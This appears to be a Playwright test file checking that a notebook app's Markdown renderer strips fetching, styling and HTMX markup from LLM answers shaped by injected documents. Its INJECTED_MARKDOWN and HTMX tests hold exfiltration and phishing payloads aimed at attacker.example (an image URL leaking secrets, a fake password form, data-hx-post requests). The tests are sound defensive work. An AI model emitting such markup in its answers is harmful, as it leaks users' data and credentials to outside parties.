"""Rendered-Markdown hardening in app/static/app.js, driven in a real browser.

Almost everything `renderMarkdown()` renders is LLM output, and the LLM reads
uploaded documents an outside party may have written. The property that matters
is the one the reader is exposed to: **rendering an answer must not make the
browser fetch anything, post anywhere, restyle the page, or bind app behaviour**,
whatever the Markdown says. That cannot be observed from Python, so these tests
load the real `marked` + `DOMPurify` + `app.js` into Chromium, serve them from a
fake host, and record every request beyond the page and its scripts.

Contract: docs/SECURITY.md -> "Rendering LLM output".

CI installs Chromium for this file (see .github/workflows/ci.yml). Locally the
tests skip with a reason when Playwright or its browser is missing; in CI
(`CI` set) they fail instead, so the sanitizer is never silently unheld.
"""

from __future__ import annotations

import html
import json
import os
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
STATIC = ROOT / "app" / "static"
APP_ORIGIN = "http://app.test"
ATTACKER = "attacker.example"


def _unavailable(reason: str) -> None:
    if os.environ.get("CI"):
        pytest.fail(f"browser test cannot run in CI: {reason}")
    pytest.skip(reason)


@pytest.fixture(scope="module")
def browser():
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        _unavailable("playwright is not installed (pip install -r requirements-dev.txt)")
    with sync_playwright() as playwright:
        try:
            instance = playwright.chromium.launch()
        except Exception as exc:  # browser binary missing / wrong revision
            _unavailable(f"chromium unavailable ({exc.__class__.__name__}); run `python -m playwright install chromium`")
        yield instance
        instance.close()


def _i18n_payload() -> str:
    from app.i18n import js_messages

    return json.dumps(js_messages(), ensure_ascii=False)


def _page_html(markdown: str, citations: list[dict] | None = None) -> str:
    citations_attr = html.escape(json.dumps(citations or []), quote=True)
    return f"""<!doctype html>
<html><head><meta charset="utf-8">
<script>window.I18N = {_i18n_payload()};</script>
<script defer src="/static/vendor/marked.min.js"></script>
<script defer src="/static/vendor/purify.min.js"></script>
<script defer src="/static/app.js"></script>
</head><body>
<div id="md" class="markdown-body" data-markdown data-citations="{citations_attr}">{html.escape(markdown)}</div>
</body></html>"""


PAGE_URL = f"{APP_ORIGIN}/notebooks/1"
SCRIPTS = {
    f"{APP_ORIGIN}/static/vendor/marked.min.js": STATIC / "vendor" / "marked.min.js",
    f"{APP_ORIGIN}/static/vendor/purify.min.js": STATIC / "vendor" / "purify.min.js",
    f"{APP_ORIGIN}/static/app.js": STATIC / "app.js",
}


def _render(browser, markdown: str, citations: list[dict] | None = None):
    """Render `markdown` through app.js.

    Returns (page, fetched): `fetched` lists every request other than the page
    and its three scripts -- same-origin ones included, since an image the
    answer was told to load from this app is still a fetch nobody asked for.
    Those requests are answered 404 rather than raising, so a regression shows
    up as a failed assertion, not as a broken harness.
    """
    page = browser.new_page()
    fetched: list[str] = []

    def handle(route):
        url = route.request.url
        if url == PAGE_URL:
            route.fulfill(body=_page_html(markdown, citations), content_type="text/html; charset=utf-8")
        elif url in SCRIPTS:
            route.fulfill(path=str(SCRIPTS[url]), content_type="application/javascript")
        else:
            fetched.append(url)
            route.fulfill(status=404, body="")

    page.route("**/*", handle)
    page.goto(PAGE_URL)
    page.wait_for_function("document.getElementById('md').dataset.markdownRendered === '1'")
    # Give any fetch an inserted element would trigger time to be issued.
    page.wait_for_timeout(300)
    return page, fetched


INJECTED_MARKDOWN = "\n\n".join(
    [
        "答案如下 [1]",
        f"![機密摘要](https://{ATTACKER}/c?d=SECRET_FROM_OTHER_DOC)",
        f'<img src="https://{ATTACKER}/raw.png" alt="raw">',
        f'<picture><source srcset="https://{ATTACKER}/s.png"></picture>',
        f'<form action="https://{ATTACKER}/login" method="post">'
        '<input name="password" type="password" placeholder="請重新輸入密碼">'
        "<button>確認</button></form>",
        f'<div style="position:fixed;inset:0;background:url(https://{ATTACKER}/bg.png)">系統維護</div>',
        f"<style>body{{background:url(https://{ATTACKER}/style.png)}}</style>",
        f'<svg><image href="https://{ATTACKER}/svg.png"/></svg>',
        f'<iframe src="https://{ATTACKER}/frame"></iframe>',
        f'<video poster="https://{ATTACKER}/poster.png"></video>',
        f'<span data-fill-question data-text="x" data-hx-get="https://{ATTACKER}/hx" '
        'data-hx-trigger="load">chip</span>',
        f'<a href="https://{ATTACKER}/ping" ping="https://{ATTACKER}/p">ping</a>',
    ]
)


def test_rendering_injected_markdown_fetches_nothing(browser):
    page, fetched = _render(browser, INJECTED_MARKDOWN)
    try:
        assert fetched == []
    finally:
        page.close()


def test_rendering_strips_fetching_form_style_and_behaviour_markup(browser):
    page, _fetched = _render(browser, INJECTED_MARKDOWN)
    try:
        found = page.evaluate(
            """() => {
              const root = document.getElementById('md');
              const all = Array.from(root.querySelectorAll('*'));
              return {
                tags: all.map((el) => el.tagName.toLowerCase()),
                styled: all.filter((el) => el.hasAttribute('style')).length,
                dataAttrs: all.flatMap((el) => Array.from(el.attributes)
                  .map((a) => a.name).filter((n) => n.startsWith('data-'))),
                pingAttrs: all.filter((el) => el.hasAttribute('ping')).length,
                inputs: all.filter((el) => el.tagName === 'INPUT').length,
              };
            }"""
        )
        forbidden = {"img", "picture", "source", "form", "button", "style", "svg", "iframe", "video", "image"}
        assert forbidden.isdisjoint(found["tags"]), found["tags"]
        assert found["styled"] == 0
        assert found["dataAttrs"] == []
        assert found["pingAttrs"] == 0
        assert found["inputs"] == 0
    finally:
        page.close()


def test_markdown_images_become_click_through_links_naming_the_host(browser):
    markdown = "\n\n".join(
        [
            f"![機密 <b>摘要</b>](https://{ATTACKER}/c?d=1&e=2)",
            "![站內圖](/static/logo.png)",
            "![](javascript:alert(1))",
        ]
    )
    page, fetched = _render(browser, markdown)
    try:
        images = page.evaluate(
            """() => Array.from(document.querySelectorAll('#md .md-image-link')).map((el) => ({
              tag: el.tagName.toLowerCase(),
              text: el.textContent,
              href: el.getAttribute('href'),
              target: el.getAttribute('target'),
              rel: el.getAttribute('rel'),
            }))"""
        )
        assert images == [
            {
                "tag": "a",
                "text": f"圖片：機密 <b>摘要</b>（{ATTACKER}）",
                "href": f"https://{ATTACKER}/c?d=1&e=2",
                "target": "_blank",
                "rel": "noopener noreferrer nofollow",
            },
            {
                "tag": "a",
                "text": "圖片：站內圖",
                "href": f"{APP_ORIGIN}/static/logo.png",
                "target": None,
                "rel": None,
            },
            {"tag": "span", "text": "圖片：未命名", "href": None, "target": None, "rel": None},
        ]
        assert fetched == []
    finally:
        page.close()


def test_links_keep_safe_targets_and_external_ones_open_isolated(browser):
    markdown = "\n\n".join(
        [
            f"[外部](https://{ATTACKER}/doc)",
            "[站內](/notebooks/2)",
            "[錨點](#section)",
            "[信件](mailto:ops@example.com)",
            '<a href="javascript:alert(1)">js</a>',
            '<a href="data:text/html,hi">data</a>',
        ]
    )
    page, _fetched = _render(browser, markdown)
    try:
        links = page.evaluate(
            """() => Array.from(document.querySelectorAll('#md a')).map((a) => [
              a.textContent, a.getAttribute('href'), a.getAttribute('target'), a.getAttribute('rel'),
            ])"""
        )
        assert links == [
            ["外部", f"https://{ATTACKER}/doc", "_blank", "noopener noreferrer nofollow"],
            ["站內", "/notebooks/2", None, None],
            ["錨點", "#section", None, None],
            ["信件", "mailto:ops@example.com", None, None],
            ["js", None, None, None],
            ["data", None, None, None],
        ]
    finally:
        page.close()


def test_ordinary_markdown_still_renders(browser):
    """Guard the legitimate output the hardening must not break."""
    markdown = "\n".join(
        [
            "## 重點",
            "",
            "| 項目 | 數量 |",
            "|:-:|--:|",
            "| A | 1 |",
            "",
            "- [ ] 待辦",
            "- [x] 完成",
            "",
            "<details><summary>更多</summary>內容</details>",
            "",
            "依據 [1] 與 [2]。",
        ]
    )
    citations = [
        {"index": 1, "source_id": 7, "chunk_id": 70, "filename": "a.pdf", "location": "p.1"},
        {"index": 2, "source_id": 8, "chunk_id": 80, "filename": "b.pdf", "location": "p.2"},
    ]
    page, _fetched = _render(browser, markdown, citations)
    try:
        state = page.evaluate(
            """() => {
              const root = document.getElementById('md');
              const boxes = Array.from(root.querySelectorAll('input'));
              return {
                heading: root.querySelector('h2') && root.querySelector('h2').textContent,
                align: Array.from(root.querySelectorAll('th')).map((th) => th.getAttribute('align')),
                boxes: boxes.map((b) => [b.type, b.disabled, b.checked]),
                details: !!root.querySelector('details > summary'),
                cites: Array.from(root.querySelectorAll('a.cite-link')).map((a) => [
                  a.textContent, a.dataset.sourceId, a.dataset.chunkId,
                ]),
              };
            }"""
        )
        assert state == {
            "heading": "重點",
            "align": ["center", "right"],
            "boxes": [["checkbox", True, False], ["checkbox", True, True]],
            "details": True,
            "cites": [["[1]", "7", "70"], ["[2]", "8", "80"]],
        }
    finally:
        page.close()


HTMX_SCRIPT = f"{APP_ORIGIN}/static/vendor/htmx.min.js"


def test_htmx_swapped_markdown_cannot_issue_requests(browser):
    """Markdown that arrives through an HTMX swap (briefing, notes, the
    non-streaming answer) is rendered inside htmx:afterSwap, and HTMX then
    initialises the settled nodes. Before the hardening, an answer carrying
    `data-hx-post` made the reader's browser send that POST with the CSRF
    header attached. Drive that exact path: real htmx + real app.js."""
    injected = (
        '<span data-hx-get="/evil-get" data-hx-trigger="load">a</span>\n\n'
        '<span data-hx-post="/evil-post" data-hx-trigger="load" '
        'data-hx-vals=\'{"title": "pwned"}\'>b</span>'
    )
    fragment = f'<div class="markdown-body" data-markdown>{html.escape(injected)}</div>'
    page_html = f"""<!doctype html>
<html><head><meta charset="utf-8">
<script>window.I18N = {_i18n_payload()};</script>
<script defer src="/static/vendor/marked.min.js"></script>
<script defer src="/static/vendor/purify.min.js"></script>
<script defer src="/static/vendor/htmx.min.js"></script>
<script defer src="/static/app.js"></script>
</head><body>
<div id="target" hx-get="/fragment" hx-trigger="load" hx-swap="innerHTML"></div>
</body></html>"""
    scripts = {**SCRIPTS, HTMX_SCRIPT: STATIC / "vendor" / "htmx.min.js"}
    fetched: list[str] = []
    page = browser.new_page()

    def handle(route):
        url = route.request.url
        if url == PAGE_URL:
            route.fulfill(body=page_html, content_type="text/html; charset=utf-8")
        elif url in scripts:
            route.fulfill(path=str(scripts[url]), content_type="application/javascript")
        elif url == f"{APP_ORIGIN}/fragment":
            route.fulfill(body=fragment, content_type="text/html; charset=utf-8")
        else:
            fetched.append(f"{route.request.method} {url}")
            route.fulfill(status=404, body="")

    page.route("**/*", handle)
    try:
        page.goto(PAGE_URL)
        page.wait_for_function(
            "(() => { const n = document.querySelector('#target [data-markdown]');"
            " return n && n.dataset.markdownRendered === '1'; })()"
        )
        page.wait_for_timeout(500)
        assert fetched == []
        assert page.get_attribute("#target [data-markdown]", "hx-disable") == ""
    finally:
        page.close()
